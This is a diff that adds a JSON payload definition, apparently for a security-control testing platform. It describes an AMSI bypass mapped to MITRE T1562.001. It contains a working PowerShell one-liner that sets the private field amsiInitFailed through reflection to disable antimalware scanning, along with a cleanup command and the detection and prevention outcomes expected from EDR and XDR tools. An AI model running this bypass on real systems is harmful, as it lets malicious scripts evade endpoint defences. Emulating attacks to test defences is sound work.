@@ -1,0 +1,39 @@
+{
+  "command_content": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1562.001"
+  ],
+  "payload_cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n",
+  "payload_cleanup_executor": "psh",
+  "payload_description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "695eed40-e949-40e5-b306-b4031e4154bd",
+  "payload_name": "AMSI Bypass - AMSI InitFailed",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
